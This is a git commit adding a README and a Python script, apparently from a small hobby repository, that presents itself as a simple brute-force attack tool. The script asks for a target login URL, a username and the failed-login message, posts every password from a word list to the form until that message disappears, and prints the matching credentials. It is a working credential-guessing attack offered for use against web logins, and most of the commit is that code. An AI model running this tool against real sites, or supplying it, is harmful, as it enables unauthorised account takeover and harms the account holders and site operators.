62b6bcb2d60bd5558bfbfd57ce2735ab52cd245d
Tanvir Hossain Antu <tanvir.antu7@gmail.com>
2020-06-07 10:56:04 +0600

    First Commit

---
+++ README.md
@@ -0,0 +1,26 @@
+# Simple Brute Force Attack Tools Useing Python
+
+
+## Simple Installation
+
+Use the package manager [pip](https://pip.pypa.io/en/stable/) to install foobar.
+
+```bash
+pip install requests
+```
+
+## Run
+
+```bash
+python3 bruteforce.py
+```
+
+### Example Image
+
+![alt text](https://raw.githubusercontent.com/Antu7/python-bruteForce/master/example.jpg)
+
+
+## Contributing
+Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+
+Please make sure to update tests as appropriate.
---
+++ bruteforce.py
@@ -0,0 +1,29 @@
+import requests
+
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+
+try: 
+    def bruteCracking(username,url):
+        for password in passwords:
+            password = password.strip()
+            print("Trying:" + password)
+            data_dict = {"username": username,"password":password, "login":"submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
+                pass
+            elif "csrf" in str(response.content):
+                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                exit()
+            else:
+                print("Username: ---> " + username)
+                print("Password: ---> " + password)
+                exit()
+except:
+    print("Some Error Occurred Please Check Your Internet Connection !!")
+
+with open("passwords.txt", "r") as passwords:
+    bruteCracking(username,url)
+
+print("[!!] password not in list")
